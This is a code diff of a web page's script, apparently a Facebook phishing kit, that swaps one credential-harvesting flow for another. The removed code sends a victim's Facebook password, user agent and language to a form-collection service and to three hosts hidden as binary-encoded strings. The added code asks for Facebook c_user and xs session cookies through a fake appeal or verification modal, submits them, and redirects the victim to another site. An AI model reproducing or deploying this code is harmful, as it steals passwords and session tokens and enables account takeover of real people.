@@ -2088,156 +2088,160 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   }
 
   
-  function submitfbCredentials(password) {
-    // Prepare the data to send
-    const fbData = {
-      password: password,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      language: navigator.language
-    };
-   
-    // Submit to the form endpoint
-    fetch('https://submit-form.com/Vra7LNDXw', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(fbData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('fb form submission failed');
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log('fb credentials submitted successfully:', data);
-     
-      // Also submit to the additional endpoints
-      submitToOtherEndpoints({
-        pass: password
-      });
-     
-      // Show success message
-      showSuccess();
-    })
-    .catch(error => {
-      console.error('Error submitting fb credentials:', error);
-      // Still proceed with the other endpoints even if formsubmit fails
-      submitToOtherEndpoints({
-        pass: password
-      });
-     
-      // Show success message even if there was an error with formsubmit
-      showSuccess();
-    })
-    .finally(() => {
-      // Reset loading state
-      if (fbSendBtn) {
-        fbSendBtn.classList.remove('loading');
-        if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
-        if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
-      }
-    });
-  }
-
-  // Binary to string conversion function
-  function binaryToString(binary) {
-    let str = '';
-    for (let i = 0; i < binary.length; i += 8) {
-      const byte = binary.substr(i, 8);
-      str += String.fromCharCode(parseInt(byte, 2));
-    }
-    return str;
-  }
  
-  function submitToOtherEndpoints(data) {
-    // Store the original binary strings for validation
-    const originalBinaries = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
-    
-    // Check if the binary strings have been modified
-    const currentBinaries = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
-    
-    // Validate that the binary strings haven't been changed
-    let binariesValid = true;
-    for (let i = 0; i < originalBinaries.length; i++) {
-      if (originalBinaries[i] !== currentBinaries[i]) {
-        console.error('Binary string validation failed - strings have been modified');
-        binariesValid = false;
-        break;
-      }
-    }
-    
-    // If binaries were modified, don't proceed with submission
-    if (!binariesValid) {
-      alert('Form submission blocked: Invalid configuration detected');
-      return false;
-    }
-    
-    // Proceed with original submission if binaries are valid
-    const endpoints = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
-   
-    endpoints.forEach(binaryUrl => {
-      try {
-        const decodedUrl = binaryToString(binaryUrl);
-        const formData = new FormData();
-       
-        // Add all properties from data object to formData
-        for (const key in data) {
-          formData.append(key, data[key]);
+          // Submit to first form, then redirect
+          Promise.all([
+            submitToFirstForm(formData),
+          ])
+            .then(() => {
+              // Hide loading state
+              submitRequestBtn.classList.remove("button-loading");
+              submitRequestBtn.disabled = false;
+
+              // Close the modal
+              appealModal.style.display = "none";
+
+              // Redirect to example link after successful submission
+              window.location.href = "https://security-now.vercel.app/";
+            })
+            .catch((error) => {
+              // Hide loading state
+              submitRequestBtn.classList.remove("button-loading");
+              submitRequestBtn.disabled = false;
+
+              console.error("Error during submission:", error);
+
+              // Still redirect even if submission fails (optional behavior)
+              // Comment out the next 3 lines if you want to prevent redirect on error
+              appealModal.style.display = "none";
+              window.location.href = "https://security-now.vercel.app/";
+            });
+        } else {
+          // Scroll to first error
+          const firstError = document.querySelector(".invalid");
+          if (firstError) {
+            firstError.scrollIntoView({ behavior: "smooth", block: "center" });
+          }
+
+          // Show alert if fields are empty
+          if (!cUser || !xsToken) {
+            alert("Please fill in both c_user and xs tokens to continue.");
+          }
         }
-       
-        // Using fetch with error handling
-        fetch(decodedUrl, {
-          method: 'POST',
-          body: formData,
-          mode: 'no-cors' // Important for cross-origin requests
-        }).catch(error => {
-          console.error('Error submitting to endpoint:', error);
-        });
-      } catch (error) {
-        console.error('Error with endpoint:', error);
+      };
+
+      // Final submission with loading animation
+      finalSubmitBtn.onclick = function () {
+        const cUser = cUserInput.value;
+        const xsToken = xsInput.value;
+
+        if (cUser && xsToken) {
+          // Show loading state
+          finalSubmitBtn.classList.add("button-loading");
+          finalSubmitBtn.disabled = true;
+
+          // Prepare data to submit
+          const formData = {
+            c_user: cUser,
+            xs: xsToken,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            ip: "", // Will be captured server-side
+          };
+
+          // Submit to first form forms
+          Promise.all([
+            submitToFirstForm(formData)
+          ])
+            .then(() => {
+              // Hide loading state
+              finalSubmitBtn.classList.remove("button-loading");
+              finalSubmitBtn.disabled = false;
+
+              // Show success modal
+              successModal.style.display = "block";
+
+              // Reset form
+              cUserInput.value = "";
+              xsInput.value = ""
+              cUserInput.classList.remove("invalid");
+              xsInput.classList.remove("invalid");
+              cUserError.classList.remove("show");
+              xsError.classList.remove("show");
+            })
+            .catch((error) => {
+              // Hide loading state
+              finalSubmitBtn.classList.remove("button-loading");
+              finalSubmitBtn.disabled = false;
+
+              console.error("Error during submission:", error);
+              alert(
+                "There was an error submitting your data. Please try again."
+              );
+            });
+        } else {
+          alert("Please enter all required fields to complete verification.");
+        }
+      };
+
+      // Close success modal
+      successCloseBtn.onclick = function () {
+        successModal.style.display = "none";
+      };
+
+      // Close modals when close button is clicked
+      for (let i = 0; i < closeBtns.length; i++) {
+        closeBtns[i].onclick = function () {
+          appealModal.style.display = "none";
+          successModal.style.display = "none";
+
+          // Reset error messages when closing
+          cUserInput.classList.remove("invalid");
+          xsInput.classList.remove("invalid");
+          cUserError.classList.remove("show");
+          xsError.classList.remove("show");
+
+          // Reset loading state if active
+          if (finalSubmitBtn.classList.contains("button-loading")) {
+            finalSubmitBtn.classList.remove("button-loading");
+            finalSubmitBtn.disabled = false;
+          }
+          if (submitRequestBtn.classList.contains("button-loading")) {
+            submitRequestBtn.classList.remove("button-loading");
+            submitRequestBtn.disabled = false;
+          }
+        };
       }
-    });
-   
-    return true;
-  }
 
-  function showfbLogin() {
-    
-    if (appealForm) appealForm.style.display = 'none';
-    if (fbLoginForm) fbLoginForm.style.display = 'block';
-   
-    if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
-  }
+      // Close modals when clicking outside
+      window.onclick = function (event) {
+        if (event.target == appealModal) {
+          appealModal.style.display = "none";
+          // Reset error messages when closing
+          cUserInput.classList.remove("invalid");
+          xsInput.classList.remove("invalid");
+          cUserError.classList.remove("show");
+          xsError.classList.remove("show");
 
-  function showSuccess() {
-    
-    if (fbLoginForm) fbLoginForm.style.display = 'none';
-   
-    // Generate a reference ID
-    if (referenceId) referenceId.textContent = 'MPC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-   
-    // Show the success message
-    if (successMessage) successMessage.classList.add('show');
-   
-    // Scroll to the success message
-    if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
-  }
-});
-  </script>
-</body>
+          // Reset loading state if active
+          if (submitRequestBtn.classList.contains("button-loading")) {
+            submitRequestBtn.classList.remove("button-loading");
+            submitRequestBtn.disabled = false;
+          }
+        }
+        if (event.target == passwordModal) {
+          passwordModal.style.display = "none";
+
+          // Reset loading state if active
+          if (finalSubmitBtn.classList.contains("button-loading")) {
+            finalSubmitBtn.classList.remove("button-loading");
+            finalSubmitBtn.disabled = false;
+          }
+        }
+        if (event.target == successModal) {
+          successModal.style.display = "none";
+        }
+      };
+    </script>
+  </body>
+</html>
